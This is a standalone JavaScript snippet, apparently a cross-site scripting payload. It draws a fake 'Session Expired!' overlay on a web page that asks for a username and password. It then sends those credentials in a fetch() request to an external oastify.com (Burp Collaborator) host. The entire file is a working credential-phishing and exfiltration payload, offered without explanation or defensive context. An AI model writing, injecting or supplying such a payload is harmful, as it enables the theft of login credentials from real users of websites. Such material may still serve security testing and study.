let div = document.createElement('div');
div.style.position = 'fixed';
div.style.top = '20%';
div.style.left = '50%';
div.style.transform = 'translate(-50%, 0)';
div.style.background = 'white';
div.style.padding = '20px';
div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
div.style.zIndex = '9999';
div.innerHTML = `
    <h2>Session Expired!</h2>
    <p>Please Re-enter Your Credentials:</p>
    <input type="text" id="uName" placeholder="Username" required style="display:block; margin-bottom:10px;">
    <input type="password" id="pPass" placeholder="Password" required style="display:block; margin-bottom:10px;">
    <button id="submitBtn">Submit</button>
`;
document.body.appendChild(div);

function sendData() {
    let username = document.getElementById('uName').value;
    let password = document.getElementById('pPass').value;

    if (!username || !password) {
        alert("Please fill in both fields!");
        return;
    }

    fetch(`https://z880597xijzweuhdnc0ac0ll8ce32vqk.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
        .then(response => response.text())
        .then(data => {
            console.log("Response from server:", data);
            alert("Credentials sent successfully!");
        })
        .catch(error => {
            console.error("Error sending credentials:", error);
            alert("Thank you!");
        });
}

document.getElementById('submitBtn').addEventListener('click', sendData);





